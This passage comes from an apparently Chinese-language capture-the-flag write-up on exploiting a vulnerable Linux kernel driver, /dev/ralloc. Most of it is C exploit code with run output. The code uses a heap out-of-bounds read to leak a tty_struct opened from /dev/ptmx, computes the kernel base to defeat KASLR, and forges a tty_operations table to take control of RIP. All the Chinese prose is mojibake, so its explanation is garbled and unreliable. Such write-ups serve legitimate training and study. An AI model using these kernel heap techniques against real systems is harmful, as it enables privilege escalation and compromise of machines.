<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ioctl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line">int fd;</span><br><span class="line"></span><br><span class="line">struct user_data_struct &#123;</span><br><span class="line">    uint64_t <span class="built_in">id</span>;</span><br><span class="line">    uint64_t size;</span><br><span class="line">    void* data;</span><br><span class="line">&#125; user_data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long create_buf(uint64_t <span class="built_in">id</span>, uint64_t size)&#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1000, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">long delete_buf(uint64_t <span class="built_in">id</span>) &#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1001, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long write_buf(uint64_t <span class="built_in">id</span>, uint64_t size, void *data)&#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    user_data.data = data;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1002, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long read_buf(uint64_t <span class="built_in">id</span>, uint64_t size, void *data)&#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    user_data.data = data;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1003, &amp;user_data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨ï¼Œå°†ä»ä¸€ä¸ªç®€å•çš„mainå¼€å§‹ï¼Œå®ƒæ‰“å¼€è®¾å¤‡ï¼Œæ¸…é™¤ç¼“å†²åŒºï¼Œåˆ›å»ºä¸€ä¸ªç¼“å†²åŒºï¼Œå‘å®ƒå†™å…¥0x40å­—èŠ‚çš„Asï¼Œç„¶åä»å®ƒè¯»å–0x420å­—èŠ‚:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc) &#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ralloc&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == -1) &#123;</span><br><span class="line">        fprintf(stderr, <span class="string">&quot;Failed to open /dev/ralloc&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">        delete_buf(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    create_buf(1, 0x400);</span><br><span class="line"></span><br><span class="line">    uint64_t *input = malloc(0x400);</span><br><span class="line">    memset(input, 0x41, 0x40);</span><br><span class="line">    write_buf(1, 0x40, input);</span><br><span class="line"></span><br><span class="line">    uint64_t *output = malloc(0x420);</span><br><span class="line">    read_buf(1, 0x420, output);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0; i &lt; 0x420/8; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i % 4 == 0) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n%03x: &quot;</span>, i*8);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%016lx &quot;</span>, output[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“è¿è¡Œè¿™ä¸ªï¼Œå¾—åˆ°çš„ç»“æœåŒ¹é…æ‰€æœŸæœ›çš„:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ropetest:~$ ./exploit</span><br><span class="line"></span><br><span class="line">000: 4141414141414141 4141414141414141 4141414141414141 4141414141414141 &lt;-- 0x40 bytes of A</span><br><span class="line">020: 4141414141414141 4141414141414141 4141414141414141 4141414141414141 </span><br><span class="line">040: 6c732f6c656e7265 61686769732f6261 65686361635f646e 2f70756f7267632f &lt;-- random stuff <span class="keyword">in</span> 0x400 byte buffer</span><br><span class="line">060: 5f646e6168676973 3039286568636163 6f69737365733a35 732e343939312d6e </span><br><span class="line">080: 5553002965706f63 3d4d455453595342 530070756f726763 39383d4d554e5145 </span><br><span class="line">0a0: 5f43455355003632 494c414954494e49 313631313d44455a 3339353439323531 </span><br><span class="line">0c0: ffff9880f48c0000 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">0e0: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">100: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">120: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">140: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">160: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">180: dead000000000200 dead000000000100 dead000000000200 ffff9880f48c7598 </span><br><span class="line">1a0: ffff9880f48c7598 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">1c0: 0000000000000000 ffff9880f48c75c8 ffff9880f48c75c8 ffff9880f48c75d8 </span><br><span class="line">1e0: ffff9880f48c75d8 ffff9880f48c75e8 ffff9880f48c75e8 0000000000000000 </span><br><span class="line">200: 0000000000000000 0000000000000000 0000000000000000 ffff987fa5bf3800 </span><br><span class="line">220: 0000000000000218 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">240: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">260: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">280: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">2a0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">2c0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">2e0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">300: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">320: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">340: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">360: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">380: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">3a0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">3c0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">3e0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">400: ffffffff960c4f20 ffffffff9655c3c0 ffffffff96067120 ffffffff96711080 &lt;-- reading into next buffer</span><br></pre></td></tr></table></figure>

<h2 id="KASLR-Defeat"><a href="#KASLR-Defeat" class="headerlink" title="KASLR Defeat"></a>KASLR Defeat</h2><h3 id="ç­–ç•¥"><a href="#ç­–ç•¥" class="headerlink" title="ç­–ç•¥"></a>ç­–ç•¥</h3><p>åˆ©ç”¨å†…æ ¸å †çš„ä¸€ç§å¸¸ç”¨æŠ€æœ¯æ˜¯æ‰¾åˆ°tty_structã€‚å¯ä»¥ç¨åä½¿ç”¨å®ƒæ¥æ‰§è¡Œï¼Œä½†é¦–å…ˆå°†ä½¿ç”¨å®ƒæ¥æ³„æ¼ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€ä¸å†…æ ¸åŸºçš„å¸¸é‡åç§»é‡ç›¸ç­‰ã€‚å°†ä½¿ç”¨&#x2F;dev&#x2F;ptmxåˆ›å»ºå®ƒï¼Œè¿™æ˜¯ä¸€ä¸ª<span class="exturl" data-url="aHR0cHM6Ly9saW51eC5kaWUubmV0L21hbi80L3B0bXg=">ä¼ªç»ˆç«¯è®¾å¤‡<i class="fa fa-external-link-alt"></i></span>ã€‚æœ‰å¾ˆå¤šæ–‡ç« å±•ç¤ºäº†åˆ©ç”¨è¿™ä¸€ç‚¹çš„å¥½ä¾‹å­ï¼Œæ¯”å¦‚<span class="exturl" data-url="aHR0cHM6Ly9jaGFuZ29jaGVuLmdpdGh1Yi5pby8yMDE4LTAyLTA3LXNoYXJpZjguaHRtbA==">è¿™ä¸ª<i class="fa fa-external-link-alt"></i></span>å’Œ<span class="exturl" data-url="aHR0cHM6Ly9oYWNrbWQuaW8vQHB0ci15dWRhaS9ySnAxVHBiQlU=">è¿™ä¸ª<i class="fa fa-external-link-alt"></i></span>ã€‚</p>
<p>å…¶æ€æƒ³æ˜¯ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç¼“å†²åŒºï¼Œç„¶åç«‹å³æ‰“å¼€&#x2F;dev&#x2F;ptmxï¼Œå®ƒå°†ä¸ºtty_structåˆ†é…ä¸€ä¸ª0x2e0å­—èŠ‚çš„å†…æ ¸ç¼“å†²åŒºï¼Œå¸Œæœ›ç´§æ¥åœ¨ç¼“å†²åŒºä¹‹åã€‚å› ä¸ºå¯ä»¥è¯»å–0x20å­—èŠ‚è¶…å‡ºç¼“å†²åŒºçš„ç»“æŸï¼Œå¸Œæœ›å°†èƒ½å¤Ÿè¯»å–åˆ°ç»“æ„ï¼Œå®ƒæœ‰ä»¥ä¸‹æ ¼å¼:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct tty_struct &#123;</span><br><span class="line">	int	magic;</span><br><span class="line">	struct kref kref;</span><br><span class="line">	struct device *dev;</span><br><span class="line">	struct tty_driver *driver;</span><br><span class="line">	const struct tty_operations *ops;</span><br><span class="line">	/* ...... */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›®æ ‡æ˜¯è¯»å–tty_operationsæŒ‡é’ˆï¼Œå› ä¸ºå®ƒæŒ‡å‘ptm_unix98_opsï¼Œå®ƒä¸å†…æ ¸åŸºçš„åç§»é‡æ˜¯æ’å®šçš„ã€‚ç¬¬ä¸€ä¸ªå°è¯•æ˜¯ä½¿ç”¨TTY_MAGIC<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmh1aWhvby5jb20vZG94eWdlbi9saW51eC9rZXJuZWwvMy43L2luY2x1ZGVfMmxpbnV4XzJ0dHlfOGhfc291cmNlLmh0bWw=">å®šä¹‰ä¸º<i class="fa fa-external-link-alt"></i></span>0x5401è¿™ä¸€äº‹å®æ¥æ£€æŸ¥æ˜¯å¦è®¾æ³•è¯»å–æ­£ç¡®çš„ç»“æ„ä½“ã€‚ä½†æ˜¯ï¼Œå†…å­˜ä¸­æœ‰å¤šä¸ªtty_structï¼Œå½“æŸ¥çœ‹è°ƒè¯•å™¨æ—¶ï¼Œå®ƒä¼šå‘ç°å…¶ä»–çš„tty_structä¸æŒ‡å‘ptm_unix98_opsã€‚</p>
<p>å¯ä»¥åœ¨gdbä¸­æŸ¥çœ‹ptm_unix98_opsçš„å½“å‰åœ°å€:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  p &amp;ptm_unix98_ops</span><br><span class="line"><span class="variable">$1</span> = (const struct tty_operations *) 0xffffffff820af6a0</span><br><span class="line">&lt;ptm_unix98_ops&gt;</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶é¡¶éƒ¨çš„åœ°å€ä¼šéšç€KASLRè€Œæ”¹å˜ï¼Œä½†åº•éƒ¨çš„ä¸‰é¢—ä¸ä¼šæ”¹å˜ã€‚å› æ­¤ï¼Œå°†å¯»æ‰¾magicå’Œæœ€åä¸‰ä¸ªå­—èŠ‚ï¼ŒæœŸæœ›tty_operationsã€‚</p>
<p>è¦æ‰¾åˆ°ä»ptm_unix98_opsåˆ°å†…æ ¸åŸºçš„åç§»é‡ï¼Œå°†æŸ¥çœ‹&#x2F;proc&#x2F;kallsymsã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ropetest:~<span class="comment"># cat /proc/kallsyms | grep &#x27; startup_64&#x27;</span></span><br><span class="line">ffffffff94a00000 T startup_64</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åç§»é‡æ˜¯:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  p 0xffffffff95aaf6a0 - 0xffffffff94a00000</span><br><span class="line"><span class="variable">$1</span> = 0x10af6a0</span><br></pre></td></tr></table></figure>

<h3 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h3><p>ä¸‹é¢çš„ä»£ç å°†æ¸…é™¤æ‰€æœ‰ç¼“å†²åŒºæ§½ã€‚ç„¶åï¼Œå®ƒå°†å°è¯•æœ€å¤š32æ¬¡æ¥åˆ†é…ç¼“å†²åŒºï¼Œç„¶åç«‹å³æ‰“å¼€&#x2F;dev&#x2F;ptmx.ç„¶åï¼Œå®ƒå°†æ‰§è¡Œè¶Šç•Œè¯»å–ï¼ŒæŸ¥æ‰¾tty_operationsçš„magicå’Œæ­£ç¡®çš„ä½ä¸‰ä¸ªå­—èŠ‚ã€‚åœ¨æ‰¾åˆ°å®ƒæ—¶ï¼Œå®ƒå°†ä¸­æ–­å¹¶æ‰“å°:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc) &#123;</span><br><span class="line">    int i;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ralloc&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == -1) &#123;</span><br><span class="line">        fprintf(stderr, <span class="string">&quot;Failed to open /dev/ralloc&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">        delete_buf(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint64_t *output = malloc(0x420);</span><br><span class="line">    <span class="keyword">for</span>(i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">        create_buf(i, 0x400);</span><br><span class="line">        int ptmx = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line"></span><br><span class="line">        read_buf(1, 0x420, output);</span><br><span class="line">        <span class="keyword">if</span>((output[<span class="number">0</span>x400/<span class="number">8</span>] &amp; <span class="number">0</span>xffffffff) == <span class="number">0</span>x5401 &amp;&amp;</span><br><span class="line">           (output[<span class="number">0</span>x418/<span class="number">8</span>] &amp; <span class="number">0</span>xfff) == <span class="number">0</span>x6a0) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;[-]Failed to find tty_struct, retrying [%<span class="number">02</span>x]\n&quot;, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (i == <span class="number">0</span>x20)&#123;</span><br><span class="line">        printf(&quot;Failed to find tty_struct. Try again\n&quot;);</span><br><span class="line">        exit(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=<span class="number">0</span>x400/<span class="number">8</span>; i &lt; <span class="number">0</span>x420/<span class="number">8</span>; i++)&#123;</span><br><span class="line">        printf(&quot;<span class="number">0</span>x%<span class="number">03</span>x: %<span class="number">016</span>lx\n&quot;, i*<span class="number">8</span>, output[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰æ—¶å®ƒä»€ä¹ˆä¹Ÿæ‰¾ä¸åˆ°ï¼Œä½†å¾ˆå¤šæ—¶å€™å®ƒèƒ½æ‰¾åˆ°:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r4j@rope2:~$ /tmp/n</span><br><span class="line">[-]Failed to find tty_struct, retrying [00]</span><br><span class="line">[-]Failed to find tty_struct, retrying [01]</span><br><span class="line">[-]Failed to find tty_struct, retrying [02]</span><br><span class="line">0x400: 0000000100005401 &lt;-- magic</span><br><span class="line">0x408: 0000000000000000</span><br><span class="line">0x410: ffff9880ead25600</span><br><span class="line">0x418: ffffffff95aaf6a0 &lt;-- tty_operations</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨æŠŠå®ƒé‡æ„æˆä¸€ä¸ªå¾ªç¯ï¼Œè¿™æ ·å®ƒå°±ä¼šç»§ç»­å°è¯•ï¼Œå¦‚æœå®ƒè¾¾åˆ°32ï¼Œä»ç„¶æ²¡æœ‰æ‰¾åˆ°å®ƒ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc) &#123;</span><br><span class="line"></span><br><span class="line">    int i, <span class="built_in">id</span>;</span><br><span class="line">    uint64_t *output = malloc(0x420);</span><br><span class="line">    uint64_t kernel_base;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ralloc&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == -1) &#123;</span><br><span class="line">        fprintf(stderr, <span class="string">&quot;Failed to open /dev/ralloc&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = 0;</span><br><span class="line">    <span class="keyword">while</span>(kernel_base == 0) &#123;</span><br><span class="line">        // Clear buffers</span><br><span class="line">        <span class="keyword">for</span>(i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">            delete_buf(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Loop over buffers, create, open ptmx, check <span class="keyword">for</span> tty_struct</span><br><span class="line">        <span class="keyword">for</span>(i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">            create_buf(i, 0x400);</span><br><span class="line">            ptmx = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line"></span><br><span class="line">            read_buf(i, 0x420, output);</span><br><span class="line">            <span class="keyword">if</span>((output[<span class="number">0</span>x400/<span class="number">8</span>] &amp; <span class="number">0</span>xffffffff) == <span class="number">0</span>x5401 &amp;&amp;</span><br><span class="line">               (output[<span class="number">0</span>x418/<span class="number">8</span>] &amp; <span class="number">0</span>xfff) == <span class="number">0</span>x6a0) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            close(ptmx);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (i == <span class="number">0</span>x20)&#123;</span><br><span class="line">            printf(&quot;[-] Failed to find tty_struct. Try again.\n&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            uint64_t ptm_unix98_ops = output[<span class="number">0</span>x418/<span class="number">8</span>];</span><br><span class="line">            printf(&quot;[+] Identified ptm_unix98_ops address: %<span class="number">016</span>lx\n&quot;, ptm_unix98_ops);</span><br><span class="line">            kernel_base = ptm_unix98_ops - <span class="number">0</span>x10af6a0;</span><br><span class="line">            printf(&quot;[+] Identified kernel base address:    %<span class="number">016</span>lx\n&quot;, kernel_base);</span><br><span class="line">            id = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰æ•ˆ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ropetest:~$ ./exploit</span><br><span class="line">[-] Failed to find tty_struct. Try again.</span><br><span class="line">[-] Failed to find tty_struct. Try again.</span><br><span class="line">[+] Identified ptm_unix98_ops address: ffffffff95aaf6a0</span><br><span class="line">[+] Identified kernel base address:    ffffffff94a00000</span><br></pre></td></tr></table></figure>

<h2 id="æ§åˆ¶RIP"><a href="#æ§åˆ¶RIP" class="headerlink" title="æ§åˆ¶RIP"></a>æ§åˆ¶RIP</h2><h3 id="ç­–ç•¥-1"><a href="#ç­–ç•¥-1" class="headerlink" title="ç­–ç•¥"></a>ç­–ç•¥</h3><p>æ—¢ç„¶èƒ½æ‰“è´¥KASLRï¼Œå°±è¯•ç€æ§åˆ¶RIPã€‚ä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼Œå°†ç»§ç»­æ»¥ç”¨tty_structï¼Œç‰¹åˆ«æ˜¯ç”¨æ¥è·å¾—æ³„æ¼çš„tty_operationsç»“æ„ä½“ã€‚è¿™ä¸ªç»“æ„ä½“çš„<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvcnZhbGRzL2xpbnV4L2Jsb2IvbWFzdGVyL2luY2x1ZGUvbGludXgvdHR5X2RyaXZlci5o">ç»“æ„å¦‚ä¸‹<i class="fa fa-external-link-alt"></i></span>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct tty_operations &#123;</span><br><span class="line">	struct tty_struct * (*lookup)(struct tty_driver *driver,</span><br><span class="line">			struct file *filp, int idx);</span><br><span class="line">	int  (*install)(struct tty_driver *driver, struct tty_struct *<span class="built_in">tty</span>);</span><br><span class="line">	void (*remove)(struct tty_driver *driver, struct tty_struct *<span class="built_in">tty</span>);</span><br><span class="line">	int  (*open)(struct tty_struct * <span class="built_in">tty</span>, struct file * filp);</span><br><span class="line">	void (*close)(struct tty_struct * <span class="built_in">tty</span>, struct file * filp);</span><br><span class="line">	void (*shutdown)(struct tty_struct *<span class="built_in">tty</span>);</span><br><span class="line">	void (*cleanup)(struct tty_struct *<span class="built_in">tty</span>);</span><br><span class="line">	int  (*write)(struct tty_struct * <span class="built_in">tty</span>,</span><br><span class="line">		      const unsigned char *buf, int count);</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<p>å®ƒåŒ…å«äº†ä¸€å †æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆï¼Œè¿™äº›å‡½æ•°å°†è¢«ç”¨äºå„ç§æ“ä½œã€‚å› æ­¤ï¼Œå½“è®¾å¤‡å¥æŸ„ä¸Šè°ƒç”¨closeæ—¶ï¼Œcloseæ“ä½œåœ¨è¿™ä¸ªç»“æ„ä½“ä¸­æŸ¥æ‰¾ã€‚å› æ­¤ï¼Œå¦‚æœèƒ½æ§åˆ¶è¿™ä¸ªï¼Œå°±èƒ½æ§åˆ¶RIPã€‚</p>
<h3 id="å®ç°-1"><a href="#å®ç°-1" class="headerlink" title="å®ç°"></a>å®ç°</h3><p>ç°åœ¨å¯ä»¥æ§åˆ¶ä¸€ä¸ªæŒ‡å‘tty_operationsç»“æ„ä½“çš„æŒ‡é’ˆã€‚å°†åˆ›å»ºä¸€ä¸ªæ–°çš„ï¼Œç„¶åç”¨è‡ªå·±çš„æŒ‡é’ˆè¦†ç›–é‚£ä¸ªæŒ‡é’ˆã€‚è¦æ‹…å¿ƒçš„å”¯ä¸€å‡½æ•°æ˜¯close()ï¼Œå› ä¸ºå°†åœ¨æ’å…¥ä¼ªtty_operationsä¹‹åç«‹å³å…³é—­TTYçš„å¥æŸ„ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uint64_t *fake_tty_ops = malloc(248);</span><br><span class="line">fake_tty_ops[4] = 0xdfdfdfdfdfdfdfdf;</span><br><span class="line">output[0x418/8] = (uint64_t)fake_tty_ops;</span><br><span class="line">write_buf(<span class="built_in">id</span>, 0x420, output);</span><br><span class="line">close(ptmx);</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºRIPç°åœ¨æ˜¯0xdfdfdfdfdfdfdfdfï¼Œæ‰€ä»¥ä¼šå¯¼è‡´ç³»ç»Ÿå´©æºƒã€‚</p>
